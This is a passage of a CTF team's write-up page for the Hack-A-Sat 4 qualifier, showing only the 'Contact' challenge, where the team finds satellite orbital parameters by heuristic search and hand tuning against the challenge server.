<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Hack-A-Sat 4 Quals - Write ups &#183; mhackeroni</title><meta name=title content="Hack-A-Sat 4 Quals - Write ups &#183; mhackeroni"><meta name=description content="A collection of writeups for Hack-A-Sat 4 Quals by the mhackeroni team."><meta name=keywords content="hackasat,ctf,satellites,mhackeroni,"><link rel=canonical href=https://mhackeroni.it/writeups/2023-07-01-hackasat4-quals-writeups/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2023-07-01-hackasat4-quals-writeups/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="Hack-A-Sat 4 Quals - Write ups"><meta property="og:description" content="A collection of writeups for Hack-A-Sat 4 Quals by the mhackeroni team."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-07-01T00:00:00+00:00"><meta property="article:modified_time" content="2023-07-01T00:00:00+00:00"><meta property="article:tag" content="Hackasat"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Satellites"><meta property="article:tag" content="Mhackeroni"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack-A-Sat 4 Quals - Write ups"><meta name=twitter:description content="A collection of writeups for Hack-A-Sat 4 Quals by the mhackeroni team."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"Hack-A-Sat 4 Quals - Write ups","headline":"Hack-A-Sat 4 Quals - Write ups","description":"A collection of writeups for Hack-A-Sat 4 Quals by the mhackeroni team.","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2023-07-01-hackasat4-quals-writeups\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2023","dateCreated":"2023-07-01T00:00:00\u002b00:00","datePublished":"2023-07-01T00:00:00\u002b00:00","dateModified":"2023-07-01T00:00:00\u002b00:00","keywords":["hackasat","ctf","satellites","mhackeroni"],"mainEntityOfPage":"true","wordCount":"8945"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="📷  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="📷  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Hack-A-Sat 4 Quals - Write ups</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2023-07-01T00:00:00+00:00>1 July 2023</time><span class="px-2 text-primary-500">&#183;</span><span>8945 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">42 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>A collection of some of our writeups for Hack-A-Sat 4 Quals where we achieved 2nd place overall and finals qualification.</p><h2 class="relative group">Index<div id=index class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#index aria-label=Anchor>#</a></span></h2><ul><li><a href=#contact>Contact</a></li><li><a href=#drop-baby>dROP-Baby</a></li><li><a href=#fauxy-lady>FAUXY Lady</a></li><li><a href=#kalman-at-me-bro>Kalman At Me Bro</a></li><li><a href=#magic-space-bussin>Magic Space Bussin</a></li><li><a href=#youve-been-promoted>You&rsquo;ve Been Promoted</a></li></ul><h2 class="relative group">Contact<div id=contact class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#contact aria-label=Anchor>#</a></span></h2><h3 class="relative group">The challenge<div id=the-challenge class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge aria-label=Anchor>#</a></span></h3><p><strong>Category:</strong> Anomaly Review Bored</p><blockquote><p>Billy Bob says he&rsquo;s the best orbit designer there&rsquo;s ever been.
He designed an orbit with python skyfield that gets 230 minutes of contact on our ground station network.
Can you beat him?</p></blockquote><h4 class="relative group">Prompt<div id=prompt class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#prompt aria-label=Anchor>#</a></span></h4><p>Reachable at: <code>nc contact.quals2023-kah5Aiv9.satellitesabove.me 5300</code></p><pre tabindex=0><code>
   _|_|_|    _|_|    _|      _|  _|_|_|_|_|    _|_|      _|_|_|  _|_|_|_|_|
 _|        _|    _|  _|_|    _|      _|      _|    _|  _|            _|
 _|        _|    _|  _|  _|  _|      _|      _|_|_|_|  _|            _|
 _|        _|    _|  _|    _|_|      _|      _|    _|  _|            _|
   _|_|_|    _|_|    _|      _|      _|      _|    _|    _|_|_|      _|


    Billy Bob says he&#39;s the best orbit designer there&#39;s ever been. He designed an orbit with python skyfield that gets 230 minutes of contact on our ground station network.
    Can you beat him?

    Ground stations are located across the United States at these WGS-84 coordinates:
    Name                 Lat (deg)      Long (deg)       Alt (m)
    Cape Canaveral       28.40         -80.61             27
    Cape Cod             41.70         -70.03              9
    Anchorage            61.21        -149.90             40
    Vandenberg           34.76        -120.52            122
    Denver               39.74        -104.98           1594

    Contact is established at 15 degrees above the horizon and with one ground station at a time.
    Our link budget supports a range of up to 6,000 km.
    Between 1 Apr 2023 00:00:00.000 UTC and 1 Apr 2023 08:00:00.000 UTC, get more hours of contact than Billy Bob.

    Good luck!


Provide your TLE Line 2 parameters.
Inclination (deg):
RAAN (deg):
Eccentricity (x10^-7):
Argument of perigee (deg):
Mean anomaly (deg):
Mean motion (revs/day):
</code></pre><h4 class="relative group">Description<div id=description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description aria-label=Anchor>#</a></span></h4><p>Positional data about 5 ground stations around the United Stated were given:</p><pre tabindex=0><code>Name                 Lat (deg)      Long (deg)       Alt (m)
Cape Canaveral       28.40         -80.61             27
Cape Cod             41.70         -70.03              9
Anchorage            61.21        -149.90             40
Vandenberg           34.76        -120.52            122
Denver               39.74        -104.98           1594
</code></pre><p>The challenge asked for six parameters (Inclination, RAAN, Eccentricity,
Argument of perigee, Mean anomaly and Mean motion) to be used for a satellite
orbiting around the Earth, such that the satellite would get >230 minutes of
contact with the ground station network.</p><p>The challenge then gives more details about the scenario of the challenge.</p><ul><li>Contact is established at 15 degrees above the horizon and with one ground station at a time.</li><li>The link budget supports a range of up to 6,000 km.</li><li>The time of the orbit to be considered is between 1 Apr 2023 00:00:00.000 UTC and 1 Apr 2023 08:00:00.000 UTC</li></ul><h3 class="relative group">Solution<div id=solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution aria-label=Anchor>#</a></span></h3><h4 class="relative group">Initial idea<div id=initial-idea class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#initial-idea aria-label=Anchor>#</a></span></h4><p>As a first idea, we thought of solving the challenge by understanding the
problem and developing a well developed and justified solution.</p><p>Well, that didn&rsquo;t happen: here is how we solved this task.</p><h4 class="relative group">First tries<div id=first-tries class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#first-tries aria-label=Anchor>#</a></span></h4><p>When the challenge was released, some members of our team started sending to the
remote connection random values or random patterns for the six parameters
requested: some tries were worse and some better&mldr;</p><p>After a few tries, we came up with:</p><pre tabindex=0><code>Inclination (deg):         45
RAAN (deg):                45
Eccentricity (x10^-7):     0
Argument of perigee (deg): 45
Mean anomaly (deg):        45
Mean motion (revs/day):    15
</code></pre><p>That gave 61 minutes of contact time. Following with:</p><pre tabindex=0><code>Inclination (deg):         12
RAAN (deg):                10
Eccentricity (x10^-7):     10
Argument of perigee (deg): 10
Mean anomaly (deg):        10
Mean motion (revs/day):    10
</code></pre><p>Which gave a grand total of 105 minutes.</p><p>Having some great starting points, almost halfway through the value requested by the challenge, we started to write an <strong>A* search</strong> using the values in minutes returned by the remote challenge as a heuristic.</p><p>The motivation behind the A* algorithm was to try to slowly improve our best solutions by generating random variations and hoping to get better contact times.</p><p>The algorithm works by keeping a <strong>heap</strong> (a queue with the &ldquo;best&rdquo; element always at the top) with a lot of inputs to try.
Every cycle, the top element of the heap is popped out and is sent to the remote server. After checking the result in minutes with the best current result, the script generates random variations of that input, and pushes the variations back into the <strong>heap</strong>, weighting them by the result received by the server.</p><p>The variation of the inputs is really basic, something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>rnd</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>63</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_tuple</span> <span class=o>=</span> <span class=p>[</span><span class=n>inclination</span><span class=p>,</span> <span class=n>raan</span><span class=p>,</span> <span class=n>eccentricity</span><span class=p>,</span> <span class=n>arg_perigee</span><span class=p>,</span> <span class=n>mean_anomaly</span><span class=p>,</span> <span class=n>mean_motion</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>bit</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>rnd</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>6</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>new_tuple</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_tuple</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=nb>int</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span> <span class=o>*</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=o>-</span><span class=mi>500</span><span class=p>,</span> <span class=mi>500</span><span class=p>)</span> <span class=o>*</span> <span class=n>DELTA</span>
</span></span></code></pre></div><p>We first generate a &ldquo;mask&rdquo; to choose which elements to change, and then we add some random values to the elements chosen.</p><h4 class="relative group">Improving the results<div id=improving-the-results class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#improving-the-results aria-label=Anchor>#</a></span></h4><p>We got lucky and, while still sending random stuff by hand, we got to:</p><pre tabindex=0><code>Inclination (deg):         60
RAAN (deg):                10
Eccentricity (x10^-7):     10
Argument of perigee (deg): 10
Mean anomaly (deg):        30
Mean motion (revs/day):    10
</code></pre><p>Which gave an impressive 171 minutes of contact time.</p><p>We ran the script starting with that input and (after adjusting the eccentricity
by hand) slowly improved the results, getting timings like 178, &mldr;, 199, &mldr;
and 211 with:</p><pre tabindex=0><code>Inclination: 115.831300
RAAN: 187.375700
Eccentricity: 1290114.660000
Arg Perigee: 230.202200
Mean Anomaly: 159.298200
Mean Motion: 9.654654
</code></pre><p>Improving from here was getting difficult, and we started writing a local
simulator that would act similar to the remote server, to speed up the A* search
(in the end the simulator wasn&rsquo;t always correct, so we left the scripts
running).</p><p>Lowering the <code>DELTA</code> in the script, we got some better inputs, such as:</p><pre tabindex=0><code>Inclination: 114.881300
RAAN: 175.965700
Eccentricity: 1290122.490000
Arg Perigee: 236.002200
Mean Anomaly: 171.928200
Mean Motion: 9.404654
</code></pre><p>With 213 minutes of contact, and:</p><pre tabindex=0><code>Provide your TLE Line 2 parameters.
Inclination: 107.641800
RAAN: 175.370600
Eccentricity: 1290126.607700
Arg Perigee: 234.187200
Mean Anomaly: 170.385800
Mean Motion: 8.307954
</code></pre><p>With 214 minutes of contact.</p><h4 class="relative group">Final<div id=final class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final aria-label=Anchor>#</a></span></h4><p>With a little help from the local tests, we got to the input:</p><pre tabindex=0><code>Inclination: 117.791300
RAAN: 180.615700
Eccentricity: 2050128.000000
Arg Perigee: 239.192200
Mean Anomaly: 175.058200
Mean Motion: 9.404654
</code></pre><p>Which gave a score of 225, really close! From here, we got to 226 and 227 with
the remote script, until one of our teammates started changing stuff by hand and
got the input:</p><pre tabindex=0><code>Inclination: 112
RAAN: 175
Eccentricity: 23000000
Arg Perigee: 238
Mean Anomaly: 150
Mean Motion: 9.9
</code></pre><p>Which got a enough time of contact!</p><h3 class="relative group">Solution script<div id=solution-script class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-script aria-label=Anchor>#</a></span></h3><p>One of the (multiple) heuristics solve scripts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>skyfield.api</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>heapq</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PREV_SCORE</span> <span class=o>=</span> <span class=mi>170</span>
</span></span><span class=line><span class=cl><span class=n>DELTA</span> <span class=o>=</span> <span class=mf>0.01</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pq</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>heapify</span><span class=p>(</span><span class=n>pq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># here are some random checkpoints from which we started</span>
</span></span><span class=line><span class=cl><span class=c1># heappush(pq, (-PREV_SCORE, 60, 10, 10, 10, 30, 10))</span>
</span></span><span class=line><span class=cl><span class=c1># heappush(pq, (-PREV_SCORE, 60, 10, 1000000, 10, 30, 10))</span>
</span></span><span class=line><span class=cl><span class=n>heappush</span><span class=p>(</span><span class=n>pq</span><span class=p>,</span> <span class=p>(</span><span class=o>-</span><span class=mf>215.000000</span><span class=p>,</span> <span class=mf>111.621200</span><span class=p>,</span> <span class=mf>172.495300</span><span class=p>,</span> <span class=mf>1290108.581600</span><span class=p>,</span> <span class=mf>239.212900</span><span class=p>,</span> <span class=mf>153.050600</span><span class=p>,</span> <span class=mf>9.571854</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># heappush(pq, (-175.000000, 58.700000, 10.000000, 999992.700000, 9.740000, 28.000000, 14.510000))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=c1># connection stuff</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;contact.quals2023-kah5Aiv9.satellitesabove.me&#34;</span><span class=p>,</span> <span class=mi>5300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Ticket please:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;TICKET&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># read best entry</span>
</span></span><span class=line><span class=cl>	<span class=n>score</span><span class=p>,</span> <span class=n>inclination</span><span class=p>,</span> <span class=n>raan</span><span class=p>,</span> <span class=n>eccentricity</span><span class=p>,</span> <span class=n>arg_perigee</span><span class=p>,</span> <span class=n>mean_anomaly</span><span class=p>,</span> <span class=n>mean_motion</span> <span class=o>=</span> <span class=n>heappop</span><span class=p>(</span><span class=n>pq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;OLD_SCORE: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>score</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Inclination: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>inclination</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;RAAN: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>raan</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Eccentricity: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>eccentricity</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Arg Perigee: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>arg_perigee</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Mean Anomaly: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>mean_anomaly</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Mean Motion: </span><span class=si>%f</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>mean_motion</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Inclination (deg):&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>inclination</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;RAAN (deg):&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>raan</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Eccentricity (x10^-7):&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>eccentricity</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Argument of perigee (deg):&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>arg_perigee</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Mean anomaly (deg):&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>mean_anomaly</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
